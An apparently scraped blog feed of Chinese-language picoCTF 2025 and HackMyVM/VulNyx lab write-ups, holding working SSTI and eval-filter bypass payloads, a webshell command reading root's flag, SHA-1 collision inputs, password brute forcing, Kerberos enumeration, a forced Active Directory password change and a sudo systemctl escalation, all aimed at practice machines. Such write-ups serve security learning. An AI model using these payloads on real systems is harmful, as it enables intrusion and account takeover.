#\rUser：目录扫描得到隐藏路径，通过SQL注入可以查看到文件源码，再次通过联合注入伪造身份，进入到命令执行，通过泄露的数据库密码进行登录，然后切换用户拿到user.txt。\nRoot：反编译查看到存在栈溢出漏洞，不过没有可以写入的地方，也不存在危险函数返回。这里利用的是覆盖system的参数为一个字符串（\\x00结尾的合法linux文件名），在环境变量将当前目录排在最前面，因此可以直接访问到该目录中的s可执行文件，再挂载到端口上，通过pwntools的remote连接，成功提权。\n","date":"2025-03-12","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-singdancerap/","section":"Posts","summary":"","title":"HackMyVM-SingDanceRap","type":"posts"},{"content":"","date":"2025-03-12","externalUrl":null,"permalink":"/tags/picoctf/","section":"Tags","summary":"","title":"Picoctf","type":"tags"},{"content":"\rWeb #\rCookie Monster Secret Recipe #\r任意登录后发现Cookie字段\n进行URL解码和Base64解码\nhead-dump #\r在网页源码中发现一个**/api-docs**路由\n进入之后执行一下**/heapdump**的GET方法，发现响应的是一个下载链接\n用**notepad++**打开，搜索字符串\nn0s4n1ty 1 #\r没有任何检验的上传，可以直接传一个PHP木马\n使用sudo -l检查，发现www-data可以执行任何命令，无需密码\nMatching Defaults entries for www-data on challenge:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser www-data may run the following commands on challenge:\r(ALL) NOPASSWD: ALL 如下构造\n/uploads/webshell.php?cmd=sudo cat /root/flag.txt SSTI1 #\r如下构造即可\n{{lipsum.__globals__.os.popen(\u0026#39;ls\u0026#39;).read()}}\r{{lipsum.__globals__.os.popen(\u0026#39;cat flag\u0026#39;).read()}} WebSockFish #\r随便移动一个小兵向前一步\n然后抓包，修改为：eval -10000000000000\n3v@l #\r在网页源码中看到过滤情况\n\u0026lt;!--\rTODO\r------------\rSecure python_flask eval execution by 1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind\r2.Implementing regex: r\u0026#39;0x[0-9A-Fa-f]+|\\\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.\u0026#39;\r--\u0026gt; 尝试引入模块，使用加号拼接，可以看到成功找到os模块\n尝试调用popen查看目录\n可以通过chr函数来绕过关键字符\n__import__(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39; + chr(32) + chr(47)).read() __import__(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;c\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;t\u0026#39; + chr(32) + chr(47)+\u0026#39;f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;x\u0026#39;+\u0026#39;t\u0026#39;).read() SSTI2 #\r构造的目标如下\n{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}} 过滤比较严格，用set来进行拼接字符串\n//获取下划线 _\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{{line}}\r//获取双下划线 __\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{{dbline}}\r//获取 __globals__\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{{glbs}}\r//__getitem__\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{%set gtem=dbline+\u0026#34;getitem\u0026#34;+dbline%}{{gtem}}\r//all\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{%set gtem=dbline+\u0026#34;getitem\u0026#34;+dbline%}{%set cmd=\u0026#34;l\u0026#34;+\u0026#34;s\u0026#34; %}{%set rd=\u0026#34;read\u0026#34;%}{%set pp=\u0026#34;po\u0026#34;+\u0026#34;pen\u0026#34;%}{{lipsum|attr(glbs)|attr(gtem)(\u0026#39;os\u0026#39;)|attr(pp)(cmd)|attr(rd)()}} 读取flag即可\n{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{%set gtem=dbline+\u0026#34;getitem\u0026#34;+dbline%}{%set cmd=\u0026#34;ca\u0026#34;+\u0026#34;t fl\u0026#34;+\u0026#34;ag\u0026#34; %}{%set rd=\u0026#34;read\u0026#34;%}{%set pp=\u0026#34;po\u0026#34;+\u0026#34;pen\u0026#34;%}{{lipsum|attr(glbs)|attr(gtem)(\u0026#39;os\u0026#39;)|attr(pp)(cmd)|attr(rd)()}} Apriti sesamo #\remacs 备份文件名一般会在后面加一个**~**\n\u0026lt;?php\rif (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pwd\u0026#39;])) {\r$yuf85e0677 = $_POST[\u0026#39;username\u0026#39;];\r$rs35c246d5 = $_POST[\u0026#39;pwd\u0026#39;];\rif ($yuf85e0677 == $rs35c246d5) {\recho \u0026#34;\u0026lt;br\u0026gt;\u0026lt;!-- Security Warning --\u0026gt;\u0026#34;;\r} else {\rif (sha1($yuf85e0677) === sha1($rs35c246d5)) {\recho file_get_contents(\u0026#34;../foobar\u0026#34;);\r} else {\recho \u0026#34;\u0026lt;br\u0026gt;\u0026lt;!-- Security Warning --\u0026gt;\u0026#34;;\r}\r}\r}\r?\u0026gt; 可以看到是SHA1强比较：ctf中强md5及sha1碰撞绕过（字符串string型）-CSDN博客\nusername=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1\u0026amp;pwd=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 Pachinko #\r如图连线，然后提交\n","date":"2025-03-12","externalUrl":null,"permalink":"/posts/2025/03/picoctf-2025/","section":"Posts","summary":"","title":"picoCTF 2025","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Solitude ❯ nmap 192.168.56.115 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 2b:c7:6c:06:c7:80:41:bc:cb:dc:fe:d6:e8:85:db:b0 (RSA)\r| 256 61:d1:67:f9:8f:99:62:9b:d4:9a:70:19:ff:78:bd:77 (ECDSA)\r|_ 256 2b:6e:53:ab:ac:68:ca:78:a7:d6:2f:34:65:e8:5d:17 (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 08:00:27:22:A4:A8 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\r| smb2-time: | date: 2025-03-11T20:26:05\r|_ start_date: N/A\r|_nbstat: NetBIOS name: SOLITUDE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown)\r|_clock-skew: 7h59m57s Enum4linux #\r[root@kali] /home/kali/Solitude ❯ enum4linux -a 192.168.56.115\r[+] Enumerating users using SID S-1-22-1 and logon username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; S-1-22-1-1000 Unix User\\garret (Local User) 找到一个用户名：garret\nCrackPasswd #\r尝试对其进行密码爆破\n[root@kali] /home/kali/Solitude ❯ crackmapexec smb 192.168.56.115 -u \u0026#39;garret\u0026#39; -p /usr/share/wordlists/rockyou.txt SMB 192.168.56.115 445 SOLITUDE [+] SOLITUDE\\garret:inuyasha 得到密码为：inuyasha\nSMB #\r使用smbmap进行查看权限\n查看Shared目录，是ssh密钥，将id_rsa下载下来。\nchmod 600 id_rsa Root #\r查看特殊命令\ngarret@solitude:~$ sudo -l\rMatching Defaults entries for garret on solitude:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser garret may run the following commands on solitude:\r(ALL) NOPASSWD: /usr/bin/systemctl systemctl | GTFOBins 可以使用其中的第C条\nsudo systemctl\r!sh Summary #\rUser：通过enum4linux找到用户garret，使用crackmapexec进行密码爆破，在smb中获取到登陆密钥\nRoot：systemctl权限不当，直接提权。\n","date":"2025-03-11","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-solitude/","section":"Posts","summary":"","title":"VulnVM-Solitude","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.114 -sV -A -p- ⏎\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-11 02:36:46Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megachange.nyx0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megachange.nyx0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r9389/tcp open mc-nmf .NET Message Framing\r47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC\r49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49671/tcp open msrpc Microsoft Windows RPC\r49674/tcp open msrpc Microsoft Windows RPC\r49675/tcp open msrpc Microsoft Windows RPC\r49680/tcp open msrpc Microsoft Windows RPC\r49697/tcp open msrpc Microsoft Windows RPC\rMAC Address: 08:00:27:DD:48:CA (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Microsoft Windows 2019\rOS details: Microsoft Windows Server 2019\rNetwork Distance: 1 hop\rService Info: Host: CHANGE; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: 15h59m57s\r|_nbstat: NetBIOS name: CHANGE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:dd:48:ca (Oracle VirtualBox virtual NIC)\r| smb2-time: | date: 2025-03-11T02:37:41\r|_ start_date: N/A 把megachange.nyx添加到**/etc/hosts**\n再通过Kerberos端口枚举一下用户\n[root@kali] /home/kali/Desktop ❯ nmap --script=krb5-enum-users --script-args=krb5-enum-users.realm=megachange.nyx -p88 192.168.56.114 ⏎\rHost is up (0.00023s latency).\rPORT STATE SERVICE\r88/tcp open kerberos-sec\r| krb5-enum-users: | Discovered Kerberos principals\r| administrator@megachange.nyx\r|_ sysadmin@megachange.nyx\rMAC Address: 08:00:27:DD:48:CA (Oracle VirtualBox virtual NIC)\rNmap done: 1 IP address (1 host up) scanned in 0.23 seconds UserEnum #\r可以使用的字典：kerberos_enum_dict/userlists_english/usernames.txt at master · jearyorg/kerberos_enum_dict\n再用msf的模块进行探测一下\nmsf6 auxiliary(gather/kerberos_enumusers) \u0026gt; run\r[*] Using domain: MEGACHANGE.NYX - 192.168.56.114:88 ...\r[+] 192.168.56.114 - User: \u0026#34;administrator\u0026#34; is present\r[+] 192.168.56.114 - User: \u0026#34;alfredo\u0026#34; is present\r[+] 192.168.56.114 - User: \u0026#34;change\u0026#34; is present\r[-] 192.168.56.114 - User: \u0026#34;guest\u0026#34; account disabled or expired 那么整合一下现在获取到的用户名列表\nadministrator\rsysadmin\rchange\ralfredo BruteUser #\r[root@kali] /home/kali/Desktop ❯ ./kerbrute bruteuser --dc 192.168.56.114 -d megachange.nyx /usr/share/wordlists/rockyou.txt alfredo\r__ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop\r2025/03/11 11:41:04 \u0026gt; Using KDC(s):\r2025/03/11 11:41:04 \u0026gt; 192.168.56.114:88\r2025/03/11 11:41:09 \u0026gt; [+] VALID LOGIN: alfredo@megachange.nyx:Password1\r2025/03/11 11:41:09 \u0026gt; Done! Tested 3527 logins (1 successes) in 5.049 seconds 得到alfredo的密码是Password1，再用crackmapexec看看用户，确实只有这几个。\nBloodhound #\r使用bloodhound-python进行获取\n[root@kali] /home/kali/Change ❯ bloodhound-python -u alfredo -p Password1 -ns 192.168.56.114 -d megachange.nyx -c all --zip\rINFO: Found AD domain: megachange.nyx\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (change.megachange.nyx:88)] [Errno -2] Name or service not known\rINFO: Connecting to LDAP server: change.megachange.nyx\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: change.megachange.nyx\rINFO: Found 6 users\rINFO: Found 52 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: CHANGE.megachange.nyx\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250311140042_bloodhound.zip 可以看到alfredo可以强制修改sysadmin的密码。\nForceChangePassword #\r使用bloodyAD来进行修改密码\n[root@kali] /home/kali ❯ bloodyAD --host \u0026#34;192.168.56.114\u0026#34; -d \u0026#34;megachange.nyx\u0026#34; -u \u0026#34;alfredo\u0026#34; -p \u0026#34;Password1\u0026#34; set password SYSADMIN \u0026#39;123456ABC!\u0026#39; ⏎\r[+] Password changed successfully! 修改之后，可以通过5985端口进行登录，拿到user.txt\nRoot #\r查看当前SYSADMIN的所属组以及权限\n*Evil-WinRM* PS C:\\tmp\u0026gt; whoami /groups\rGROUP INFORMATION\r-----------------\rGroup Name Type SID Attributes\r=========================================== ================ ============ ==================================================\rEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group\rMandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448\r*Evil-WinRM* PS C:\\tmp\u0026gt; whoami /priv\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r============================= ============================== =======\rSeMachineAccountPrivilege Add workstations to domain Enabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled 没有可以直接利用的。上传Winpeas进行分析\n发现存在自动登录的密码！\n因此可以直接使用evil-winrm进行登录\nSummary #\rUser：通过Kerberos进行用户枚举，建议使用大一点的字典，然后对alfredo进行密码爆破。使用bloodhound进行域内分析，得出alfredo可以修改sysadmin的密码，修改后可以登录sysadmin拿到user.txt\nRoot：由于sysadmin不属于特殊组，也没有特殊权限。通过Winpeas输出可以得到存在自动登录的管理员凭证，可以直接登录到Administrator（要注意登录的时候不要写成administrator），拿到root.txt\n","date":"2025-03-11","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-change/","section":"Posts","summary":"","title":"VulNyx-Change","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Matrioshka ❯ nmap 192.168.56.108 -sV -A -p- -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\r| ssh-hostkey: | 256 b5:a4:7c:65:5c:1f:d7:89:42:bd:76:df:2c:8e:93:4e (ECDSA)\r|_ 256 5d:3d:2b:43:fc:89:fa:24:a3:f4:73:5f:7b:89:6c:e3 (ED25519)\r80/tcp open http Apache httpd 2.4.61 ((Debian))\r|_http-server-header: Apache/2.4.61 (Debian)\r|_http-title: mamushka\rMAC Address: 08:00:27:D5:7C:4C (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 5.X\rOS CPE: cpe:/o:linux:linux_kernel:5\rOS details: Linux 5.0 - 5.5\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 将mamushka.hmv添加到**/etc/hosts**\nWPscan #\r可以看到是Wordpress搭建的网站\n找到用户名是admin\n这里我使用的是aggressive模式来扫描插件\n[root@kali] /home/kali/Matrioshka ❯ wpscan --url \u0026#34;http://mamushka.hmv/\u0026#34; --plugins-detection aggressive --plugins-version-detection aggressive --api-token \u0026lt;YOUR-TOKEN\u0026gt;\r\u0026lt;PASS\u0026gt;\r[i] Plugin(s) Identified:\r[+] akismet\r| Location: http://mamushka.hmv/wp-content/plugins/akismet/\r| Latest Version: 5.3.7\r| Last Updated: 2025-02-14T18:49:00.000Z\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/akismet/, status: 403\r|\r| [!] 1 vulnerability identified:\r|\r| [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)\r| Fixed in: 3.1.5\r| References:\r| - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357\r| - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/\r| - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html\r|\r| The version could not be determined.\r[+] meta-generator-and-version-info-remover\r| Location: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/\r| Latest Version: 16.0 (up to date)\r| Last Updated: 2024-11-20T05:03:00.000Z\r| Readme: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/, status: 403\r|\r| Version: 16.0 (100% confidence)\r| Found By: Readme - Stable Tag (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\r| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\r[+] ultimate-member\r| Location: http://mamushka.hmv/wp-content/plugins/ultimate-member/\r| Last Updated: 2025-03-03T17:36:00.000Z\r| Readme: http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\r| [!] The version is out of date, the latest version is 2.10.1\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/ultimate-member/, status: 403\r|\r| [!] 7 vulnerabilities identified:\r|\r| [!] Title: Ultimate Member \u0026lt; 2.8.7 - Cross-Site Request Forgery to Membership Status Change\r| Fixed in: 2.8.7\r| References:\r| - https://wpscan.com/vulnerability/2b670a80-2682-4b7f-a549-64a35345e630\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8520\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ffddc03-d4ae-460e-972a-98804d947d09\r|\r| [!] Title: Ultimate Member \u0026lt; 2.8.7 - Authenticated (Contributor+) Stored Cross-Site Scripting\r| Fixed in: 2.8.7\r| References:\r| - https://wpscan.com/vulnerability/7488f9f3-03ea-4f4e-b5fb-c0dd02c5bb59\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8519\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/9e394bb2-d505-4bf1-b672-fea3504bf936\r|\r| [!] Title: Ultimate Member \u0026lt; 2.9.0 - Missing Authorization to Authenticated (Subscriber+) Arbitrary User Profile Picture Update\r| Fixed in: 2.9.0\r| References:\r| - https://wpscan.com/vulnerability/54a53b30-4249-4559-85f8-7aeac2dc0df2\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10528\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/0a9793b6-2186-46ef-b204-d8f8f154ebf3\r|\r| [!] Title: Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction \u0026amp; Membership Plugin \u0026lt; 2.9.2 - Information Exposure\r| Fixed in: 2.9.2\r| References:\r| - https://wpscan.com/vulnerability/cb9c5ef8-51f8-4a46-ae56-23302c5980aa\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0318\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/4ee149bf-ffa3-4906-8be2-9c3c40b28287\r|\r| [!] Title: Ultimate Member \u0026lt; 2.9.2 - Unauthenticated SQL Injection\r| Fixed in: 2.9.2\r| References:\r| - https://wpscan.com/vulnerability/31ef60db-4847-4623-a194-8722e668e6ab\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0308\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/e3e5bb98-2652-499a-b8cd-4ebfe1c1d890\r|\r| [!] Title: Ultimate Member \u0026lt; 2.10.0 - Authenticated SQL Injection\r| Fixed in: 2.10.0\r| References:\r| - https://wpscan.com/vulnerability/90b5192a-ceee-4612-8e21-2341bae29cad\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12276\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/846f9828-2f1f-4d08-abfb-909b8d634d8a\r|\r| [!] Title: Ultimate Member \u0026lt; 2.10.1 - Unauthenticated SQLi\r| Fixed in: 2.10.1\r| References:\r| - https://wpscan.com/vulnerability/1d39ff72-1178-4812-be55-9bf4b58bbbb6\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1702\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/34adbae5-d615-4f8d-a845-6741d897f06c\r|\r| Version: 2.8.6 (100% confidence)\r| Found By: Readme - Stable Tag (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\r| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\r[+] wp-automatic\r| Location: http://mamushka.hmv/wp-content/plugins/wp-automatic/\r| Latest Version: 3.109.2\r| Last Updated: 2025-03-09T10:54:44.000Z\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/wp-automatic/, status: 200\r|\r| [!] 7 vulnerabilities identified:\r|\r| [!] Title: Automatic 2.0.3 - csv.php q Parameter SQL Injection\r| Fixed in: 2.0.4\r| References:\r| - https://wpscan.com/vulnerability/dadc99ca-54ee-42b4-b247-79a47b884f03\r| - https://www.exploit-db.com/exploits/19187/\r| - https://packetstormsecurity.com/files/113763/\r|\r| [!] Title: WordPress Automatic \u0026lt; 3.53.3 - Unauthenticated Arbitrary Options Update\r| Fixed in: 3.53.3\r| References:\r| - https://wpscan.com/vulnerability/4e5202b8-7317-4a10-b9f3-fd6999192e15\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4374\r| - https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/\r|\r| [!] Title: Automatic \u0026lt; 3.92.1 - Cross-Site Request Forgery to Privilege Escalation\r| Fixed in: 3.92.1\r| References:\r| - https://wpscan.com/vulnerability/fa2f3687-7a5f-4781-8284-6fbea7fafd0e\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27955\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/12adf619-4be8-4ecf-8f67-284fc44d87d0\r|\r| [!] Title: Automatic \u0026lt; 3.92.1 - Unauthenticated Arbitrary File Download and Server-Side Request Forgery\r| Fixed in: 3.92.1\r| References:\r| - https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27954\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/620e8931-64f0-4d9c-9a4c-1f5a703845ff\r|\r| [!] Title: Automatic \u0026lt; 3.92.1 - Unauthenticated SQL Injection\r| Fixed in: 3.92.1\r| References:\r| - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27956\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a\r|\r| [!] Title: WordPress Automatic Plugin \u0026lt; 3.93.0 Cross-Site Request Forgery\r| Fixed in: 3.93.0\r| References:\r| - https://wpscan.com/vulnerability/e5d0dcec-41a7-40ae-b9ce-f839de9c28b8\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32693\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/6231e47e-2120-4746-97c1-2aa80aa18f4e\r|\r| [!] Title: WordPress Automatic \u0026lt; 3.95.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via autoplay Parameter\r| Fixed in: 3.95.0\r| References:\r| - https://wpscan.com/vulnerability/d0198310-b323-476a-adf8-10504383ce1c\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4849\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/4be58bfa-d489-45f5-9169-db8bab718175\r|\r| The version could not be determined. Nuclei #\r[root@kali] /home/kali/Desktop/nuclei ❯ ./nuclei -u http://mamushka.hmv/ ⏎\r__ _\r____ __ _______/ /__ (_)\r/ __ \\/ / / / ___/ / _ \\/ /\r/ / / 